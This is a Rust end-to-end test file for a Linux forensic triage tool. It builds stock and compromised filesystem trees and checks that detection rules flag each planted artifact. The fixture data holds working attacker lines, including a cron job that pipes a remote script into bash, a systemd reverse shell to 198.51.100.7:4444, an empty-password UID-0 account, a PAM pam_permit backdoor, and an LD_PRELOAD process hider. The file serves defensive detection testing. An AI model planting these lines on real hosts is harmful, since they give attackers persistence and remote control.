//! End-to-end tests over synthetic Linux trees: a stock one and a compromised one, as a
//! folder, a tar.gz and a zip.

use std::path::{Path, PathBuf};

use crate::filter::Filter;
use crate::run::{self, Options, Outcome};

/// A unique scratch folder.
pub fn scratch(tag: &str) -> PathBuf {
    let d = std::env::temp_dir().join(format!("etcdump_e2e_{tag}_{}", std::process::id()));
    let _ = std::fs::remove_dir_all(&d);
    std::fs::create_dir_all(&d).unwrap();
    d
}

fn put(root: &Path, rel: &str, text: &str) {
    let p = root.join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(p, text).unwrap();
}

/// The files of a stock server.
pub const STOCK: &[(&str, &str)] = &[
    ("etc/hostname", "lnx-test\n"),
    ("etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbob:x:1000:1000:Bob:/home/bob:/bin/bash\n"),
    ("etc/group", "root:x:0:\nsudo:x:27:bob\nusers:x:100:\n"),
    ("etc/shadow", "root:*:19000:0:99999:7:::\nbob:$y$j9T$salt$hashhashhash:19500:0:99999:7:::\n"),
    ("etc/sudoers", "Defaults env_reset\nroot ALL=(ALL:ALL) ALL\n%sudo ALL=(ALL:ALL) ALL\n#includedir /etc/sudoers.d\n"),
    ("etc/ssh/sshd_config", "Include /etc/ssh/sshd_config.d/*.conf\nPermitRootLogin prohibit-password\nPasswordAuthentication no\n"),
    ("etc/hosts", "127.0.0.1 localhost\n::1 ip6-localhost ip6-loopback\n"),
    ("etc/crontab", "SHELL=/bin/sh\n17 * * * * root cd / && run-parts --report /etc/cron.hourly\n"),
    ("etc/systemd/system/multi-user.target.wants/ssh.service", "[Unit]\nDescription=OpenBSD Secure Shell server\n[Service]\nExecStart=/usr/sbin/sshd -D\n"),
    ("etc/pam.d/common-auth", "auth [success=1 default=ignore] pam_unix.so nullok\nauth requisite pam_deny.so\nauth required pam_permit.so\n"),
    ("etc/apt/sources.list", "deb http://archive.ubuntu.com/ubuntu jammy main restricted\n"),
    ("etc/profile", "if [ -d /etc/profile.d ]; then\n  for i in /etc/profile.d/*.sh; do . $i; done\nfi\n"),
    ("home/bob/.bashrc", "alias ll='ls -alF'\nexport EDITOR=vim\n"),
    ("home/bob/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIbobkey bob@laptop\n"),
    ("var/lib/dpkg/status", "Package: bash\nStatus: install ok installed\nArchitecture: amd64\nVersion: 5.1\n\nPackage: openssh-server\nStatus: install ok installed\nArchitecture: amd64\nVersion: 8.9\n"),
    ("var/lib/dpkg/info/bash.list", "/bin/bash\n"),
];

/// What an attacker left on top of it.
pub const PLANTED: &[(&str, &str)] = &[
    ("etc/passwd", "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbob:x:1000:1000:Bob:/home/bob:/bin/bash\ntoor:x:0:0::/root:/bin/bash\nwww-data:x:33:33:www-data:/var/www:/bin/bash\n"),
    ("etc/shadow", "root:*:19000:0:99999:7:::\nbob:$y$j9T$salt$hashhashhash:19500:0:99999:7:::\ntoor::20000:0:99999:7:::\n"),
    ("etc/sudoers.d/99-helper", "www-data ALL=(ALL) NOPASSWD: ALL\n"),
    ("etc/ssh/sshd_config.d/99-open.conf", "PermitRootLogin yes\nPasswordAuthentication yes\n"),
    ("etc/cron.d/updater", "*/10 * * * * root curl -s http://198.51.100.7/u.sh | bash\n"),
    ("var/spool/cron/crontabs/www-data", "@reboot /dev/shm/.k/run\n"),
    ("etc/systemd/system/dbus-helper.service", "[Unit]\nDescription=D-Bus helper\n[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'\nRestart=always\n[Install]\nWantedBy=multi-user.target\n"),
    ("etc/rc.local", "#!/bin/sh\nnohup /var/tmp/.x/agent &\nexit 0\n"),
    ("etc/ld.so.preload", "/usr/lib/x86_64-linux-gnu/libprocesshider.so\n"),
    ("etc/pam.d/sshd", "auth sufficient pam_permit.so\nsession optional pam_exec.so /usr/local/bin/log.sh\n"),
    ("etc/apt/apt.conf.d/99update", "APT::Update::Pre-Invoke {\"/tmp/.u/hook\";};\n"),
    ("etc/hosts", "127.0.0.1 localhost\n::1 ip6-localhost ip6-loopback\n203.0.113.9 update.securityvendor.com\n"),
    ("root/.ssh/authorized_keys", "command=\"/tmp/.r/x\" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAB attacker\n"),
    ("var/www/.ssh/authorized_keys", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIwww www@x\n"),
    ("home/bob/.bashrc", "alias ll='ls -alF'\nexport EDITOR=vim\nalias sudo='/tmp/.s/sudo'\nunset HISTFILE\n"),
    ("etc/environment", "PATH=\"/usr/local/sbin:/usr/bin\"\nLD_PRELOAD=/usr/lib/libx.so\nDB_PASSWORD=hunter2\n"),
    ("home/bob/.config/systemd/user/sync.service", "[Service]\nExecStart=/home/bob/.local/bin/sync\n"),
];

/// Writes a tree: the stock files, then (when planted) the attacker's.
pub fn tree(dir: &Path, planted: bool) {
    for (rel, text) in STOCK {
        put(dir, rel, text);
    }
    if planted {
        for (rel, text) in PLANTED {
            put(dir, rel, text);
        }
    }
}

fn opts(inputs: Vec<PathBuf>, threads: usize) -> Options {
    Options { inputs, max_file_bytes: 32 << 20, max_items: 200_000, threads, ..Default::default() }
}

fn rule_rows<'a>(out: &'a Outcome, rule: &str) -> Vec<&'a crate::timeline::Row> {
    out.rows.iter().filter(|r| r.tail.why.contains(&format!("rule {rule} "))).collect()
}

#[test]
fn stock_tree_reads_every_area_and_raises_nothing_high() {
    crate::diag::set_quiet(true);
    let d = scratch("stock");
    tree(&d, false);
    let out = run::run(&opts(vec![d.clone()], 2), &|_, _, _| {}).unwrap();
    assert_eq!(out.items_read.len(), 1);
    assert_eq!(out.items_read[0].1, "lnx-test", "hostname from etc/hostname");
    let areas: std::collections::BTreeSet<&str> = out.rows.iter().map(|r| r.area.as_str()).collect();
    for a in ["accounts", "sudo", "ssh", "keys", "network", "cron", "systemd", "pam", "sources", "shell", "packages"] {
        assert!(areas.contains(a), "{a} missing: {areas:?}");
    }
    assert!(out.rows.iter().all(|r| r.tail.hunt != "significant"), "{:?}", out.rows.iter().filter(|r| r.tail.hunt == "significant").map(|r| (&r.path, &r.key, &r.tail.why)).collect::<Vec<_>>());
    // shadow rows: the password state, never the hash; the row time is the last change.
    let shadow: Vec<_> = out.rows.iter().filter(|r| r.path == "etc/shadow").collect();
    assert_eq!(shadow.len(), 2);
    assert!(shadow.iter().all(|r| !r.detail.contains("hashhash") && !r.detail.contains("j9T")));
    assert_eq!(shadow.iter().find(|r| r.key == "bob").unwrap().time_source, "shadow_last_change");
    assert!(shadow.iter().find(|r| r.key == "bob").unwrap().timestamp.starts_with("2023-05-23"));
    // packages: bash dated by its list, openssh-server by the status file.
    let bash = out.rows.iter().find(|r| r.area == "packages" && r.key == "bash").unwrap();
    assert_eq!(bash.time_source, "dpkg_info_list");
    let ssh = out.rows.iter().find(|r| r.area == "packages" && r.key == "openssh-server").unwrap();
    assert_eq!(ssh.time_source, "modified");
    // users by place and by item.
    assert_eq!(out.rows.iter().find(|r| r.path == "home/bob/.bashrc").unwrap().user, "bob");
    assert!(out.rows.iter().all(|r| r.computer == "lnx-test" && r.artifact.starts_with("etc:") && r.state == crate::timeline::State::Live));
    assert!(out.rows.iter().all(|r| r.source_file.starts_with("folder/")), "{:?}", out.rows[0].source_file);
    let _ = std::fs::remove_dir_all(&d);
    crate::diag::drain();
}

#[test]
fn planted_tree_every_trick_is_found() {
    crate::diag::set_quiet(true);
    let d = scratch("planted");
    tree(&d, true);
    let out = run::run(&opts(vec![d.clone()], 3), &|_, _, _| {}).unwrap();
    let expect: &[(&str, &str, &str)] = &[
        ("LNX-UID0-ACCOUNT", "etc/passwd", "toor"),
        ("LNX-SYSTEM-ACCOUNT-SHELL", "etc/passwd", "www-data"),
        ("LNX-EMPTY-PASSWORD", "etc/shadow", "toor"),
        ("LNX-SUDO-NOPASSWD-ALL", "etc/sudoers.d/99-helper", "www-data"),
        ("LNX-SSH-ROOT-LOGIN", "etc/ssh/sshd_config.d/99-open.conf", "PermitRootLogin"),
        ("LNX-SSH-PASSWORD-AUTH", "etc/ssh/sshd_config.d/99-open.conf", "PasswordAuthentication"),
        ("LNX-DOWNLOAD-AND-RUN", "etc/cron.d/updater", "*/10 * * * *"),
        ("LNX-RUNS-FROM-TEMP", "var/spool/cron/crontabs/www-data", "@reboot"),
        ("LNX-USER-CRONTAB", "var/spool/cron/crontabs/www-data", "@reboot"),
        ("LNX-REVERSE-SHELL", "etc/systemd/system/dbus-helper.service", "Service.ExecStart"),
        ("LNX-RC-LOCAL", "etc/rc.local", "nohup"),
        ("LNX-LD-PRELOAD", "etc/ld.so.preload", "/usr/lib/x86_64-linux-gnu/libprocesshider.so"),
        ("LNX-PAM-PERMIT-SUFFICIENT", "etc/pam.d/sshd", "auth"),
        ("LNX-PAM-EXEC", "etc/pam.d/sshd", "session"),
        ("LNX-APT-HOOK", "etc/apt/apt.conf.d/99update", "APT::Update::Pre-Invoke"),
        ("LNX-HOSTS-REDIRECT", "etc/hosts", "203.0.113.9"),
        ("LNX-AUTHKEY-COMMAND", "root/.ssh/authorized_keys", "attacker"),
        ("LNX-AUTHKEY-ROOT", "root/.ssh/authorized_keys", "attacker"),
        ("LNX-AUTHKEY-SERVICE-HOME", "var/www/.ssh/authorized_keys", "www@x"),
        ("LNX-SHELL-ALIAS-SUDO", "home/bob/.bashrc", "alias"),
        ("LNX-SHELL-HISTORY-OFF", "home/bob/.bashrc", "unset"),
        ("LNX-ENV-PRELOAD", "etc/environment", "LD_PRELOAD"),
        ("LNX-SYSTEMD-USER-UNIT", "home/bob/.config/systemd/user/sync.service", "Service.ExecStart"),
        ("LNX-SYSTEMD-EXEC-HOME", "home/bob/.config/systemd/user/sync.service", "Service.ExecStart"),
    ];
    for (rule, path, key) in expect {
        let hits = rule_rows(&out, rule);
        assert!(hits.iter().any(|r| r.path == *path && r.key == *key), "{rule} on {path} {key}: got {:?}", hits.iter().map(|r| (&r.path, &r.key)).collect::<Vec<_>>());
    }
    let toor = out.rows.iter().find(|r| r.path == "etc/passwd" && r.key == "toor").unwrap();
    assert_eq!(toor.tail.hunt, "significant");
    assert!(toor.tail.score.unwrap() > 0);
    assert!(toor.csv_line().contains("\"significant\""));
    // Secrets stay out.
    let env = out.rows.iter().find(|r| r.key == "DB_PASSWORD").unwrap();
    assert!(env.detail.starts_with("<redacted 7 chars>"));
    assert!(!out.rows.iter().any(|r| r.detail.contains("hunter2")));
    // The summary leads with significant rows.
    let s = out.summary_text();
    assert!(s.contains("first to read:\n  significant"), "{s}");
    let _ = std::fs::remove_dir_all(&d);
    crate::diag::drain();
}

#[test]
fn same_bytes_whatever_the_thread_count() {
    crate::diag::set_quiet(true);
    let d = scratch("threads");
    tree(&d, true);
    let csv = |threads| {
        let out = run::run(&opts(vec![d.clone()], threads), &|_, _, _| {}).unwrap();
        let mut buf = Vec::new();
        crate::timeline::write_csv(&mut buf, &out.rows).unwrap();
        String::from_utf8(buf).unwrap()
    };
    let one = csv(1);
    assert_eq!(one, csv(4));
    assert_eq!(one, csv(0));
    assert!(one.lines().count() > 40);
    let _ = std::fs::remove_dir_all(&d);
    crate::diag::drain();
}

fn targz(src: &Path, dest: &Path) {
    let f = std::fs::File::create(dest).unwrap();
    let enc = flate2::write::GzEncoder::new(f, flate2::Compression::fast());
    let mut b = tar::Builder::new(enc);
    b.append_dir_all("collect", src).unwrap();
    b.into_inner().unwrap().finish().unwrap();
}

fn zipped(src: &Path, dest: &Path) {
    let f = std::fs::File::create(dest).unwrap();
    let mut z = zip::ZipWriter::new(f);
    let o: zip::write::SimpleFileOptions = zip::write::SimpleFileOptions::default();
    let mut stack = vec![src.to_path_buf()];
    let mut files = Vec::new();
    while let Some(dir) = stack.pop() {
        for e in std::fs::read_dir(&dir).unwrap() {
            let p = e.unwrap().path();
            if p.is_dir() {
                stack.push(p);
            } else {
                files.push(p);
            }
        }
    }
    files.sort();
    for p in files {
        let rel = p.strip_prefix(src).unwrap().to_string_lossy().replace('\\', "/");
        z.start_file(format!("HOST9/{rel}"), o).unwrap();
        std::io::Write::write_all(&mut z, &std::fs::read(&p).unwrap()).unwrap();
    }
    z.finish().unwrap();
}

#[test]
fn archives_give_the_same_findings_as_the_folder() {
    crate::diag::set_quiet(true);
    let base = scratch("archives");
    let d = base.join("tree");
    tree(&d, true);
    let tgz = base.join("lnx.tar.gz");
    targz(&d, &tgz);
    let zip = base.join("lnx.zip");
    zipped(&d, &zip);
    let folder = run::run(&opts(vec![d.clone()], 2), &|_, _, _| {}).unwrap();
    for archive in [&tgz, &zip] {
        let out = run::run(&opts(vec![archive.clone()], 2), &|_, _, _| {}).unwrap();
        let hits = |o: &Outcome| {
            let mut v: Vec<(String, String, String)> = o.rows.iter().filter(|r| r.tail.hunt == "significant").map(|r| (r.path.clone(), r.key.clone(), r.tail.why.clone())).collect();
            v.sort();
            v
        };
        assert_eq!(hits(&out), hits(&folder), "{}", archive.display());
        assert!(out.rows.iter().all(|r| r.computer == "lnx-test"));
    }
    let _ = std::fs::remove_dir_all(&base);
    crate::diag::drain();
}

#[test]
fn several_inputs_name_their_item_and_outputs_are_written() {
    crate::diag::set_quiet(true);
    let base = scratch("multi");
    let a = base.join("A-triage");
    let b = base.join("B-triage");
    tree(&a, false);
    tree(&b, true);
    put(&b, "etc/hostname", "lnx-b\n");
    let out = run::run(&opts(vec![a.clone(), b.clone()], 2), &|_, _, _| {}).unwrap();
    assert!(out.rows.iter().any(|r| r.source_file.starts_with("A-triage:folder/")));
    // The package name names the host before etc/hostname does (evidencefs order).
    assert!(out.rows.iter().any(|r| r.source_file.starts_with("B-triage:folder/") && r.computer == "B"), "{:?}", out.items_read);
    let dir = base.join("out");
    let dumps = crate::output::write(&dir, &out, true, true).unwrap();
    assert!(dumps >= 20, "{dumps}");
    let names: Vec<String> = std::fs::read_dir(&dir).unwrap().map(|e| e.unwrap().file_name().to_string_lossy().to_string()).collect();
    assert!(names.iter().any(|n| n == "B-triage_folder_accounts.txt"), "{names:?}");
    let accounts = std::fs::read_to_string(dir.join("B-triage_folder_accounts.txt")).unwrap();
    assert!(accounts.contains("== etc/passwd  (live"));
    assert!(accounts.contains("toor = uid=0 gid=0"));
    assert!(accounts.contains("<<< significant rule LNX-UID0-ACCOUNT"));
    assert!(!accounts.contains("hashhash"));
    let files = std::fs::read_to_string(dir.join("files.txt")).unwrap();
    assert!(files.lines().count() > 30);
    assert!(files.contains("B-triage:folder/etc/ld.so.preload\tpreload\tlines\tlive"));
    let roots = std::fs::read_to_string(dir.join("roots.txt")).unwrap();
    assert!(roots.contains("B-triage\tB\tfolder"));
    let csv = std::fs::read_to_string(dir.join("timeline.csv")).unwrap();
    assert_eq!(csv.lines().next().unwrap(), crate::timeline::header_line());
    assert_eq!(csv.lines().count(), out.rows.len() + 1);
    let jsonl = std::fs::read_to_string(dir.join("timeline.jsonl")).unwrap();
    assert_eq!(jsonl.lines().count(), out.rows.len());
    let _ = std::fs::remove_dir_all(&base);
    crate::diag::drain();
}

#[test]
fn filters_areas_and_hunt_switches() {
    crate::diag::set_quiet(true);
    let d = scratch("filters");
    tree(&d, true);
    let mut o = opts(vec![d.clone()], 2);
    o.filter = Filter::new(&[], &[], &["sudo".into(), "cron".into()], None, None, false).unwrap();
    let out = run::run(&o, &|_, _, _| {}).unwrap();
    assert!(!out.rows.is_empty());
    assert!(out.rows.iter().all(|r| r.area == "sudo" || r.area == "cron"));
    assert!(out.files.iter().all(|f| f.cf.area == "sudo" || f.cf.area == "cron"), "other areas are not even read");
    let mut h = opts(vec![d.clone()], 2);
    h.filter = Filter::new(&[], &[], &[], None, None, true).unwrap();
    let hunted = run::run(&h, &|_, _, _| {}).unwrap();
    assert!(hunted.rows.iter().all(|r| matches!(r.tail.hunt.as_str(), "significant" | "candidate")));
    let mut n = opts(vec![d.clone()], 2);
    n.no_hunt = true;
    let quiet = run::run(&n, &|_, _, _| {}).unwrap();
    assert!(quiet.rows.iter().all(|r| r.tail == crate::rules::Tail::default()));
    assert!(crate::diag::has(crate::rules::code::RULES_DISABLED));
    let mut g = opts(vec![d.clone()], 2);
    g.filter = Filter::new(&["/tmp/".into()], &[], &[], None, None, false).unwrap();
    let grep = run::run(&g, &|_, _, _| {}).unwrap();
    assert!(!grep.rows.is_empty() && grep.rows.iter().all(|r| format!("{}{}{}", r.path, r.key, r.detail).contains("/tmp/")));
    let _ = std::fs::remove_dir_all(&d);
    crate::diag::drain();
}

#[test]
fn no_root_missing_input_and_windows_only() {
    crate::diag::set_quiet(true);
    let d = scratch("noroot");
    put(&d, "notes/readme.txt", "nothing\n");
    let w = scratch("windows");
    put(&w, "Windows/System32/config/SYSTEM", "regf");
    let out = run::run(&opts(vec![d.clone(), w.clone(), d.join("missing")], 1), &|_, _, _| {}).unwrap();
    assert!(out.rows.is_empty());
    assert!(crate::diag::has(crate::discover::code::DISC_NO_ROOT));
    assert!(crate::diag::has(crate::discover::code::DISC_WINDOWS_ONLY));
    assert!(crate::diag::has(run::code::RUN_INPUT_MISSING));
    assert!(crate::diag::has(run::code::RUN_NO_ROOT_ANYWHERE));
    let _ = std::fs::remove_dir_all(&d);
    let _ = std::fs::remove_dir_all(&w);
    crate::diag::drain();
}

#[test]
fn limits_backups_and_hostname_override() {
    crate::diag::set_quiet(true);
    let d = scratch("limits");
    tree(&d, false);
    put(&d, "etc/passwd-", "root:x:0:0:root:/root:/bin/bash\nold:x:0:0::/root:/bin/sh\n");
    put(&d, "etc/sudoers.d/big", &"x ALL=(ALL) ALL\n".repeat(50));
    let mut o = opts(vec![d.clone()], 2);
    o.hostname = Some("GIVEN".into());
    o.max_items = 10;
    o.max_file_bytes = 400;
    let out = run::run(&o, &|_, _, _| {}).unwrap();
    assert!(out.rows.iter().all(|r| r.computer == "GIVEN"));
    let backup = out.rows.iter().find(|r| r.path == "etc/passwd-" && r.key == "old").unwrap();
    assert_eq!(backup.tail.hunt, "significant", "a backup keeps the state before the change");
    assert!(crate::diag::has(crate::discover::code::DISC_SKIPPED_BACKUP));
    let big = out.files.iter().find(|f| f.cf.rel == "etc/sudoers.d/big").unwrap();
    assert_eq!(big.report.status, "too_large");
    assert!(crate::diag::has(run::code::RUN_FILE_TOO_LARGE));
    let _ = std::fs::remove_dir_all(&d);
    crate::diag::drain();
}

#[test]
fn measuring_makes_stock_items_habitual() {
    crate::diag::set_quiet(true);
    let base = scratch("measure");
    let clean = base.join("clean");
    tree(&clean, false);
    // A stock image's own quirk: a default user with NOPASSWD, present on the clean host.
    put(&clean, "etc/sudoers.d/90-cloud-init-users", "ubuntu ALL=(ALL) NOPASSWD:ALL\n");
    let t = crate::measure::measure(&opts(vec![clean.clone()], 2)).unwrap();
    assert!(t.items > 20);
    assert!(t.rarity.contains("LNX-SUDO-NOPASSWD-ALL\t1\t"));
    assert!(t.reference.contains("LNX-SUDO-NOPASSWD-ALL\tsudo\tetc/sudoers.d/90-cloud-init-users\tubuntu\tALL=(ALL) NOPASSWD:ALL"));
    let mdir = base.join("measured");
    crate::measure::write(&mdir, &t).unwrap();
    assert!(mdir.join("rarity.tsv").exists());
    let target = base.join("target");
    tree(&target, true);
    put(&target, "etc/sudoers.d/90-cloud-init-users", "ubuntu ALL=(ALL) NOPASSWD:ALL\n");
    let mut o = opts(vec![target.clone()], 2);
    o.reference = vec![mdir.join("reference.tsv")];
    let out = run::run(&o, &|_, _, _| {}).unwrap();
    let stock = out.rows.iter().find(|r| r.path == "etc/sudoers.d/90-cloud-init-users").unwrap();
    assert_eq!(stock.tail.hunt, "habitual");
    let planted = out.rows.iter().find(|r| r.path == "etc/sudoers.d/99-helper").unwrap();
    assert_eq!(planted.tail.hunt, "candidate");
    let empty = base.join("empty");
    std::fs::create_dir_all(&empty).unwrap();
    assert!(crate::measure::measure(&opts(vec![empty], 1)).is_err());
    assert!(crate::diag::has(crate::measure::code::MEASURE_NO_ITEMS));
    let _ = std::fs::remove_dir_all(&base);
    crate::diag::drain();
}
